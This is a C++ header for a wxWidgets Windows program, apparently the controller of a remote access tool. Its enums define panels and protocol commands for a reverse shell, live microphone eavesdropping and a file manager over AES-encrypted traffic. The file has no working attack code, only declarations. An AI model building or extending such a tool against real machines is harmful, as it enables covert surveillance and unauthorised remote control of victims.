#ifndef _HEADERS
#define _HEADERS 1

#include<wx/wx.h> 
#include<wx/thread.h>
#include<wx/listctrl.h>
#include<wx/toolbar.h>
#include<wx/treectrl.h>
#include<wx/sizer.h>
#include<wx/wxhtml.h>
#include<wx/aui/aui.h>

#include<ws2tcpip.h>
#include<windows.h>
#include<iostream>
#include<mutex>
#include<atomic>
#include<thread>
#include<map>
#include<random>
#include<fcntl.h>
#include<fstream>
#include<sstream>
#include<string>
#include<vector>
#include<cstring>
#include<ctime>
#include <mmsystem.h>

#include <iomanip>

#include "aes256/aes256.hpp"

#define PING_TIME 5 * 1
#define AES_KEY_LEN 32


extern bool bSignalFlag;
#define error() std::cout<<"Error["<<GetLastError()<<"]\n";

typedef unsigned int u_int;

namespace EnumIDS {
    enum Enum {
        ID_Escuchar = 100,
        ID_Detener,
        ID_LimpiarLog,
        ID_Interactuar,
        ID_FrameClienteTest,
        TreeCtrl_ID,
        ID_Panel_Reverse_Shell,
        ID_Panel_Reverse_Shell_TxtConsole,
        ID_Panel_Test,
        ID_Panel_Label_Test,
        ID_Panel_Microphone,
        ID_Panel_Mic_CMB_Devices,
        ID_Panel_Mic_BTN_Refresh,
        ID_Panel_Mic_BTN_Escuchar,
        ID_Panel_Mic_BTN_Detener,
        ID_Panel_FM,
        ID_Panel_FM_Equipo,
        ID_Panel_FM_Escritorio,
        ID_Panel_FM_Descargas
    };
}

namespace EnumComandos {
    enum Enum {
        PONG = 499,
        PING,
        Reverse_Shell_Start,
        Reverse_Shell_Command,
        Reverse_Shell_Salida,
        Reverse_Shell_Finish,
        Mic_Refre_Dispositivos,
        Mic_Refre_Resultado,
        Mic_Iniciar_Escucha,
        Mic_Detener_Escucha,
        Mic_Live_Packet
    };
}

#endif